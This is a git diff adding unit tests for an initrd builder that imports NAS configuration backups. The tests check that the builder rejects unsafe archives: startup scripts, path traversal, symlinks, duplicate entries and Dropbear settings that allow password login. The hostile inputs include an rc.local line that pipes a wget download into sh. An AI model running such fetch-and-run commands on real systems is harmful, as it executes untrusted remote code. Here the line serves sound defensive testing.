@@ -1,17 +1,19 @@
 import base64
 import copy
+import io
 import json
 from pathlib import Path
 import stat
 import struct
 import subprocess
 import sys
+import tarfile
 import tempfile
 import unittest
 
 ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT/'scripts'))
-from make_initrd import image
+from make_initrd import image, image_from_backup, MAX_MEMBER, MAX_MEMBERS
 from cpio_newc import Entry, encode, decode, unwrap_ramdisk
 
 
@@ -142,6 +144,190 @@ class InitrdTests(unittest.TestCase):
                 encode([Entry(path, stat.S_IFREG | 0o600)])
         with self.assertRaises(ValueError):
             encode([Entry('same', 0), Entry('same', 0)])
+
+    def backup(self, members, compress='gz'):
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode='w:' + compress) as archive:
+            for name, content in members.items():
+                if isinstance(content, tarfile.TarInfo):
+                    archive.addfile(content)
+                    continue
+                info = tarfile.TarInfo(name)
+                info.size = len(content)
+                info.mode = 0o755 if name.endswith('.sh') else 0o644
+                archive.addfile(info, io.BytesIO(content))
+        return buffer.getvalue()
+
+    def typical_backup(self):
+        host_key = struct.pack('>I', 11) + b'ssh-ed25519' + bytes(100)
+        rsa_key = struct.pack('>I', 7) + b'ssh-rsa' + bytes(300)
+        public = (self.root/'admin.pub').read_text()
+        return {
+            './etc/config/system': b"config system\n\toption hostname 'live-nas'\n\toption timezone 'UTC'\n",
+            './etc/config/network': b"config interface 'lan'\n\toption device 'eth0'\n\toption proto 'dhcp'\n",
+            './etc/config/dropbear': b"config dropbear 'main'\n\toption enable '1'\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n",
+            './etc/config/hd-idle': b"config hd-idle\n\toption disk 'sda'\n\toption enabled '1'\n",
+            './etc/dropbear/dropbear_ed25519_host_key': host_key,
+            './etc/dropbear/dropbear_rsa_host_key': rsa_key,
+            './etc/dropbear/authorized_keys': ('# comment\n' + public + '\n').encode(),
+            './etc/crontabs/root': b'0 3 * * * /usr/bin/rsync -a src:/data/ /mnt/backup/\n',
+            './etc/rc.local': b'# Put your custom commands here\n\nexit 0\n',
+            './etc/sysupgrade.conf': b'## keep\n/root/.ssh/\n',
+            './etc/hosts': b'127.0.0.1 localhost\n',
+            './etc/shadow': b'root:*:0:0:99999:7:::\n',
+            './root/.ssh/id_ed25519': b'-----BEGIN OPENSSH ' + b'PRIVATE KEY-----\nfixture\n',
+        }
+
+    def test_backup_route(self):
+        entries = {e.name: e for e in decode(unwrap_ramdisk(image_from_backup(self.backup(self.typical_backup()))))[0]}
+        self.assertIn(b'source=backup\nhostname=live-nas\n', entries['etc/ls420d-deployment'].data)
+        self.assertNotIn('etc/rc.local', entries)
+        self.assertNotIn('etc/sysupgrade.conf', entries)
+        self.assertEqual(entries['etc/crontabs/root'].data.split()[0], b'0')
+        self.assertNotIn(b'anonymous-comment', entries['etc/dropbear/authorized_keys'].data)
+        self.assertNotIn(b'# comment', entries['etc/dropbear/authorized_keys'].data)
+        for name in ('etc/dropbear/dropbear_rsa_host_key', 'etc/shadow', 'root/.ssh/id_ed25519'):
+            self.assertEqual(stat.S_IMODE(entries[name].mode), 0o600, name)
+        self.assertEqual(stat.S_IMODE(entries['root/.ssh'].mode), 0o700)
+        self.assertEqual(stat.S_IMODE(entries['etc/config/hd-idle'].mode), 0o644)
+        for e in entries.values():
+            if stat.S_ISREG(e.mode):
+                self.assertEqual(e.mode & 0o111, 0, e.name)
+
+    def test_root_authorized_keys_validated_and_stripped(self):
+        members = self.typical_backup()
+        members['./root/.ssh/authorized_keys'] = ((self.root/'admin.pub').read_text() + '\n').encode()
+        entries = {e.name: e for e in decode(unwrap_ramdisk(image_from_backup(self.backup(members))))[0]}
+        self.assertNotIn(b'anonymous-comment', entries['root/.ssh/authorized_keys'].data)
+        self.assertEqual(stat.S_IMODE(entries['root/.ssh/authorized_keys'].mode), 0o600)
+
+    def test_dropbear_off_spellings_accepted(self):
+        for value in ('off', '0', 'no', '"false"', "'disabled'"):
+            members = self.typical_backup()
+            members['./etc/config/dropbear'] = ("config dropbear 'main'\n\toption PasswordAuth %s\n\toption RootPasswordAuth %s\n" % (value, value)).encode()
+            with self.subTest(value=value):
+                image_from_backup(self.backup(members))
+
+    def test_dropbear_uci_shapes_accepted(self):
+        texts = [
+            # quoted names, comment lines, anonymous section, an override that ends off
+            b"# generated\nconfig dropbear\n\toption 'PasswordAuth' \"off\"\n\toption RootPasswordAuth 'on'\n\toption \"RootPasswordAuth\" 'off'\n",
+            b"config dropbear 'main'\n    option PasswordAuth off\n    option RootPasswordAuth off\n    option BannerFile '/etc/banner text'\n\nconfig dropbear 'second'\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n",
+        ]
+        for text in texts:
+            members = self.typical_backup()
+            members['./etc/config/dropbear'] = text
+            with self.subTest(text=text):
+                image_from_backup(self.backup(members))
+
+    def test_backup_is_deterministic(self):
+        data = self.backup(self.typical_backup())
+        self.assertEqual(image_from_backup(data), image_from_backup(data))
+
+    def test_backup_rejects_scripts_and_unknown_paths(self):
+        for name, content in [
+                ('./etc/init.d/evil', b'#!/bin/sh\n'),
+                ('./etc/uci-defaults/99-evil', b'#!/bin/sh\n'),
+                ('./etc/hotplug.d/iface/00-evil', b'#!/bin/sh\n'),
+                ('./usr/bin/evil.sh', b'#!/bin/sh\n'),
+                ('./etc/rc.local', b'wget http://example.invalid/x | sh\nexit 0\n'),
+                ('./etc/config/sub/dir', b'nested\n'),
+                ('./etc/dropbear/other', b'x' * 70),
+                ('./etc/ls420d-site.uci', b"set system.@system[0].hostname='x'\n"),
+                ('../etc/hosts', b'x\n'),
+                ('./etc/config/dropbear', b"config dropbear\n\toption PasswordAuth 'on'\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"config dropbear\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth '1'\n"),
+                # Absent options mean ON for Dropbear: an omitted option is a bypass.
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption enable '1'\n"),
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption RootPasswordAuth 'off'\n"),
+                # A second instance without the options is a bypass too.
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n\nconfig dropbear 'second'\n\toption Port '2222'\n"),
+                ('./etc/config/dropbear', b"config other\n\toption PasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"# nothing\n"),
+                # UCI strips quotes from names and the last assignment wins.
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n\toption 'PasswordAuth' 'on'\n"),
+                ('./etc/config/dropbear', b'config dropbear \'main\'\n\toption PasswordAuth \'off\'\n\toption RootPasswordAuth \'off\'\n\toption "RootPasswordAuth" on\n'),
+                # config_get_bool is case-sensitive and falls back to ON for unknown values.
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'OFF'\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'nope'\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\tlist PasswordAuth 'off'\n\tlist PasswordAuth 'on'\n\toption RootPasswordAuth 'off'\n"),
+                # Syntax the parser does not model is refused instead of guessed.
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'off' # trailing\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth of\\f\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"package dropbear\nconfig dropbear 'main'\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'off' extra\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'off\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"config dropbear 'main'\r\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n"),
+                ('./etc/config/dropbear', b"option PasswordAuth 'off'\noption RootPasswordAuth 'off'\n"),
+                ('./root/.ssh/authorized_keys', b'ssh-dss AAAA garbage\n'),
+                ('./etc/config/bad.name', b"config x\n"),
+                ('./etc/dropbear/authorized_keys', b'ssh-dss AAAA garbage\n'),
+                ('./etc/dropbear/dropbear_ed25519_host_key', b'-----BEGIN OPENSSH ' + b'PRIVATE KEY-----\n' + bytes(64)),
+                ('./etc/config/network', b'text\0binary\n'),
+                ('./etc/config/large', b'x' * (MAX_MEMBER + 1))]:
+            members = self.typical_backup()
+            members[name] = content
+            with self.subTest(name=name):
+                with self.assertRaises(ValueError):
+                    image_from_backup(self.backup(members))
+
+    def test_backup_rejects_duplicate_paths_and_too_many_members(self):
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode='w:gz') as archive:
+            for name, content in self.typical_backup().items():
+                info = tarfile.TarInfo(name)
+                info.size = len(content)
+                archive.addfile(info, io.BytesIO(content))
+            # same path twice, the second with password login enabled
+            info = tarfile.TarInfo('./etc/config/dropbear')
+            payload = b"config dropbear 'main'\n\toption PasswordAuth 'on'\n\toption RootPasswordAuth 'on'\n"
+            info.size = len(payload)
+            archive.addfile(info, io.BytesIO(payload))
+        with self.assertRaises(ValueError):
+            image_from_backup(buffer.getvalue())
+        members = self.typical_backup()
+        for index in range(MAX_MEMBERS):
+            members['./etc/config/extra%d' % index] = b"config x\n"
+        with self.assertRaises(ValueError):
+            image_from_backup(self.backup(members))
+
+    def test_archive_modes_and_owners_are_ignored(self):
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode='w:gz') as archive:
+            for name, content in self.typical_backup().items():
+                info = tarfile.TarInfo(name)
+                info.size = len(content)
+                info.mode = 0o777
+                info.uid = info.gid = 1000
+                archive.addfile(info, io.BytesIO(content))
+        entries = {e.name: e for e in decode(unwrap_ramdisk(image_from_backup(buffer.getvalue())))[0]}
+        for e in entries.values():
+            self.assertEqual((e.uid, e.gid), (0, 0), e.name)
+            if stat.S_ISREG(e.mode):
+                self.assertIn(stat.S_IMODE(e.mode), (0o600, 0o644), e.name)
+
+    def test_backup_rejects_links_and_garbage(self):
+        link = tarfile.TarInfo('./etc/config/network')
+        link.type = tarfile.SYMTYPE
+        link.linkname = '/etc/passwd'
+        members = self.typical_backup()
+        members['link'] = link
+        with self.assertRaises(ValueError):
+            image_from_backup(self.backup(members))
+        with self.assertRaises(ValueError):
+            image_from_backup(b'not a tar archive')
+        with self.assertRaises(ValueError):
+            image_from_backup(self.backup({'./etc/sysupgrade.conf': b'\n'}))
+
+    def test_cli_backup_route(self):
+        archive = self.root/'backup.tar.gz'
+        archive.write_bytes(self.backup(self.typical_backup()))
+        output = self.root/'from-backup.buffalo'
+        command = [sys.executable, str(ROOT/'scripts/make_initrd.py'), '--backup', str(archive), '--output', str(output)]
+        result = subprocess.run(command, capture_output=True, text=True)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn('PRIVATE', result.stdout)
+        self.assertEqual(stat.S_IMODE(output.stat().st_mode), 0o600)
 
     def test_cli_refuses_overwrite(self):
         output = self.root/'initrd.buffalo'
